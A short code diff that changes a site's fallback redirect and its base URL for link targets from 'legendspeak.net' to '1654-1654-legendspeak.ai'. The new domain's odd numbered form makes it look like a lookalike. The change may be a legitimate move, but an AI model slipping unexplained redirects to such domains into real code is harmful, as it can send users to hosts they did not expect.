@@ -188,7 +188,7 @@ const params = new URLSearchParams(window.location.search);
 const affiliateRef = params.get('ref');
 
 if (!affiliateRef) {
-    window.location.replace('https://www.legendspeak.net');
+    window.location.replace('https://www.1654-1654-legendspeak.ai');
 }
 
 window.addEventListener('DOMContentLoaded', () => {
@@ -307,7 +307,7 @@ try {
     if (data.url.startsWith("http://") || data.url.startsWith("https://")) {
       targetUrl = new URL(data.url);
     } else {
-      targetUrl = new URL(data.url, "https://legendspeak.net");
+      targetUrl = new URL(data.url, "https://1654-1654-legendspeak.ai");
     }
 
     if (affiliateRef) targetUrl.searchParams.set("ref", affiliateRef);
